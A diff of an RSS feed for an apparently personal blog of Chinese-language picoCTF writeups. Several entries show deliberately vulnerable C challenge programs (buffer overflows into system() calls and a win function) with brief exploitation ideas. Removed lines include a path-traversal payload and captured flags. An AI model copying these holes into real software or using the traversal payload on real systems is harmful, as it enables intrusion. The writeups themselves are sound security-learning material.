@@ -314,15 +384,8 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </span></span><span class="line"><span class="cl">  <span class="nf">signal</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span> <span class="n">segfault_handler</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">  <span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// _IONBF = Unbuffered
 </span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Address of main: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">val</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the address to jump to, ex =&gt; 0x12345: &#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%lx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Your input: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">foo</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">val</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="nf">foo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">call_functions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
@@ -330,10 +393,9 @@ What is Format String Vulnerability（格式化字串漏洞）?
 </h2><h3 id="解題思路">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
 解題思路
-</h3><p>PIE保護機制會讓每次程式運行時位置不同,但每個函數間的相對位置offset不會改變,題目輸出main的真實位置,只要加上main與win的offset就能跳到那裡<br>
-PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
+</h3><p>利用Format String Vulnerability（格式化字串漏洞）洩漏的位置,因為PIE的相對位置不會改變,計算與win function 的 offset,跳過去</p>
         
-        <hr><p>本文2026-07-03首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-07-03</p>]]>
+        <hr><p>本文2026-08-25首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-25</p>]]>
       </description>
       
         <category>Picoctf</category>
@@ -343,34 +405,88 @@ PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
     
 
     <item>
-      <title>Forbidden Paths writeup</title>
-      <link>http://localhost:1313/post/forbidden_paths/</link>
-      <pubDate>Thu, 07 May 2026 07:15:52 &#43;0800</pubDate>
+      <title>Input Injection 2</title>
+      <link>http://localhost:1313/post/input_injection_2/</link>
+      <pubDate>Thu, 20 Aug 2026 11:40:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/forbidden_paths/</guid>
+      <guid>http://localhost:1313/post/input_injection_2/</guid>
       <description>
-        <![CDATA[<h1>Forbidden Paths writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Input Injection 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="解題">
+          <h2 id="原始碼">
+<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span><span class="o">*</span> <span class="n">username</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span><span class="o">*</span> <span class="n">shell</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mi">28</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;username at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;shell at %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">strcpy</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="s">&#34;/bin/pwd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter username: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello, %s. Your shell is %s.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">shell</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
-</h2><p><strong>打開題目</strong>
-<img src="/images/Forbidden_Paths/1.webp" alt="image">
-<strong>題目說他拒絕絕對路徑,我們嘗試用相對路徑查詢</strong></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">../../../../../../../../../../flag.txt
-</span></span></code></pre></div><p><img src="/images/Forbidden_Paths/2.webp" alt="image">
-<strong>成功查詢</strong>
-<img src="/images/Forbidden_Paths/3.webp" alt="image"></p>
-<blockquote>
-<p>取得flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}
-</span></span></code></pre></div></blockquote>
-<h2 id="提交flag">
-<a class="header-anchor" href="#%e6%8f%90%e4%ba%a4flag"></a>
-提交flag
-</h2><p><img src="/images/Forbidden_Paths/3.webp" alt="image"></p>
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>利用heap overflow覆蓋執行字串,取得shell</p>
         
-        <hr><p>本文2026-05-07首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-07</p>]]>
+        <hr><p>本文2026-08-20首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-20</p>]]>
+      </description>
+      
+        <category>Picoctf</category>
+      
+    </item>
+    
+    
+
+    <item>
+      <title>Silent Stream writeup</title>
+      <link>http://localhost:1313/post/silent_stream/</link>
+      <pubDate>Tue, 18 Aug 2026 22:31:52 &#43;0800</pubDate>
+      <author>ray784523@zhienw.com (Zhi Chen)</author>
+      <guid>http://localhost:1313/post/silent_stream/</guid>
+      <description>
+        <![CDATA[<h1>Silent Stream writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        
+          <h2 id="將題目的pcap檔的data提取出來">
+<a class="header-anchor" href="#%e5%b0%87%e9%a1%8c%e7%9b%ae%e7%9a%84pcap%e6%aa%94%e7%9a%84data%e6%8f%90%e5%8f%96%e5%87%ba%e4%be%86"></a>
+將題目的pcap檔的data提取出來
+</h2><h3 id="使用wireshark">
+<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8wireshark"></a>
+使用wireshark
+</h3><p><img src="/images/Silent_Stream/1.webp" alt="image"></p>
+<h3 id="提取資料">
+<a class="header-anchor" href="#%e6%8f%90%e5%8f%96%e8%b3%87%e6%96%99"></a>
+提取資料
+</h3><p>發現他都是10.10.10.10-&gt;10.10.10.11的tcp封包,且好像是同一個session,<br>
+因此我們隨便點一個封包,右鍵-&gt;Follow-&gt;TCP Stream
+<img src="/images/Silent_Stream/2.webp" alt="image">
+Show as 選擇Raw,按save as
+<img src="/images/Silent_Stream/3.webp" alt="image">
+儲存成stream.bin
+<img src="/images/Silent_Stream/4.webp" alt="image"></p>
+        
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
       </description>
       
         <category>picoctf</category>
@@ -380,155 +496,123 @@ PS : 因為是用scanf讀取所以用hex(main_addr).encode()</p>
     
 
     <item>
-      <title>Roboto Sans writeup</title>
-      <link>http://localhost:1313/post/roboto_sans/</link>
-      <pubDate>Thu, 07 May 2026 06:59:52 &#43;0800</pubDate>
+      <title>Input Injection 1</title>
+      <link>http://localhost:1313/post/input_injection_1/</link>
+      <pubDate>Tue, 18 Aug 2026 08:51:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/roboto_sans/</guid>
+      <guid>http://localhost:1313/post/input_injection_1/</guid>
       <description>
-        <![CDATA[<h1>Roboto Sans writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Input Injection 1</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="解題">
+          <h2 id="原始碼">
+<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt; </span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">200</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;What is your name?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">[</span><span class="nf">strcspn</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">)]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fun</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s">&#34;uname&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Goodbye, %s!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
-</h2><p><strong>打開題目</strong>
-<img src="/images/Roboto_Sans/1.webp" alt="image">
-<strong>嘗試查看robots.txt路徑,發現有疑似base64的編碼字串</strong>
-<img src="/images/Roboto_Sans/2.webp" alt="image">
-<strong>將其嘗試解碼</strong>
-<img src="/images/Roboto_Sans/3.webp" alt="image">
-<strong>嘗試進入到解碼路徑,取得flag</strong>
-<img src="/images/Roboto_Sans/4.webp" alt="image"></p>
-<blockquote>
-<p>取得flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">picoCTF{1nsp3ti0n_0f_w3bpag3s_ec95fa49}
-</span></span></code></pre></div></blockquote>
-<h2 id="提交flag">
-<a class="header-anchor" href="#%e6%8f%90%e4%ba%a4flag"></a>
-提交flag
-</h2><p><img src="/images/Roboto_Sans/5.webp" alt="image"></p>
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>name的大小最多可寫200,而buffer的大小最多可寫10,且strcpy為檢查字串大小直接複製,導致overflow,我們利用此覆蓋system要執行的指令</p>
         
-        <hr><p>本文2026-05-07首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-07</p>]]>
+        <hr><p>本文2026-08-18首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-18</p>]]>
       </description>
       
-        <category>picoctf</category>
+        <category>Picoctf</category>
       
     </item>
     
     
 
     <item>
-      <title>Search source writeup</title>
-      <link>http://localhost:1313/post/search_source/</link>
-      <pubDate>Thu, 07 May 2026 06:16:52 &#43;0800</pubDate>
+      <title>Echo Escape 2</title>
+      <link>http://localhost:1313/post/echo_escape_2/</link>
+      <pubDate>Thu, 13 Aug 2026 16:08:52 &#43;0800</pubDate>
       <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/search_source/</guid>
+      <guid>http://localhost:1313/post/echo_escape_2/</guid>
       <description>
-        <![CDATA[<h1>Search source writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
+        <![CDATA[<h1>Echo Escape 2</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
         
-          <h2 id="what-is-httrack">
-<a class="header-anchor" href="#what-is-httrack"></a>
-What is httrack?
-</h2><p>HTTrack 是一款免費且開源的離線瀏覽工具，能將整個網站從網路下載到本機目錄，遞迴建立所有資料夾結構，並取得 HTML、圖片及其他檔案。<br>
-主要功能包含：</p>
-        
-        <hr><p>本文2026-05-07首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-07</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>findme writeup</title>
-      <link>http://localhost:1313/post/findme/</link>
-      <pubDate>Tue, 05 May 2026 15:50:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/findme/</guid>
-      <description>
-        <![CDATA[<h1>findme writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="解題">
+          <h2 id="原始碼">
+<a class="header-anchor" href="#%e5%8e%9f%e5%a7%8b%e7%a2%bc"></a>
+原始碼
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;[!] Could not open flag.txt&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Flag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Enter the secret key: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You entered:, %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Goodbye!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="解題">
 <a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
 解題
-</h2><p><strong>打開題目</strong>
-<img src="/images/findme/1.webp" alt="image">
-<strong>利用題目給我帳密登陸後.發現一行訊息</strong>
-<img src="/images/findme/2.webp" alt="image"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-TEXT" data-lang="TEXT"><span class="line"><span class="cl">I was redirected here by a friend of mine but i couldnt find anything. Help me search for flags :-)
-</span></span></code></pre></div><p><strong>這行訊息告訴我們過程中應改有什麼被忽略了,使用burp suite進行抓取封包查看,果然過程中有3個封包,且裡面有可疑的id,將其解析即可取得flag</strong>
-<img src="/images/findme/3.webp" alt="image">
-<img src="/images/findme/4.webp" alt="image">
-<img src="/images/findme/5.webp" alt="image"></p>
+</h2><h3 id="解題思路">
+<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af"></a>
+解題思路
+</h3><p>利用fgets(buf, 128, stdin);的oevrflow 跳到win function 取得flag<br>
+ps:這題是32-bit題目</p>
         
-        <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
+        <hr><p>本文2026-08-13首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-08-13</p>]]>
       </description>
       
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>More SQLi writeup</title>
-      <link>http://localhost:1313/post/more_sqli/</link>
-      <pubDate>Tue, 05 May 2026 15:40:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/more_sqli/</guid>
-      <description>
-        <![CDATA[<h1>More SQLi writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="解題">
-<a class="header-anchor" href="#%e8%a7%a3%e9%a1%8c"></a>
-解題
-</h2><p><strong>打開題目網頁</strong>
-<img src="/images/More_SQLi/1.webp" alt="image">
-<strong>嘗試進行輸入帳密,發現查詢語句password竟然在前面</strong>
-<img src="/images/More_SQLi/2.webp" alt="image">
-<strong>進行SQL Injection</strong>
-<img src="/images/More_SQLi/3.webp" alt="image">
-<strong>取得flag</strong>
-<img src="/images/More_SQLi/4.webp" alt="image"></p>
-<blockquote>
-<p>取得flag</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}
-</span></span></code></pre></div></blockquote>
-<h2 id="提交flag">
-<a class="header-anchor" href="#%e6%8f%90%e4%ba%a4flag"></a>
-提交flag
-</h2><p><img src="/images/More_SQLi/5.webp" alt="image"></p>
-        
-        <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
-      </description>
-      
-        <category>picoctf</category>
-      
-    </item>
-    
-    
-
-    <item>
-      <title>SOAP writeup</title>
-      <link>http://localhost:1313/post/soap/</link>
-      <pubDate>Tue, 05 May 2026 14:39:52 &#43;0800</pubDate>
-      <author>ray784523@zhienw.com (Zhi Chen)</author>
-      <guid>http://localhost:1313/post/soap/</guid>
-      <description>
-        <![CDATA[<h1>SOAP writeup</h1><p>作者：Zhi Chen（ray784523@zhienw.com）</p>
-        
-          <h2 id="what-is-xxe-injection">
-<a class="header-anchor" href="#what-is-xxe-injection"></a>
-What is XXE Injection?
-</h2><p>XXE（XML External Entity）注入是一種針對 XML 解析器的攻擊手法。XML 本身有個功能叫做實體（Entity），允許你定義「變數」來引用外部資源。<br>
-XXE 攻擊就是利用這個功能，讓伺服器去讀取它不該暴露的東西。此攻擊能用於：</p>
-        
-        <hr><p>本文2026-05-05首發於<a href='http://localhost:1313/'>zhi旅程</a>，最後修改於2026-05-05</p>]]>
-      </description>
-      
-        <category>picoctf</category>
+        <category>Picoctf</category>
       
     </item>
     
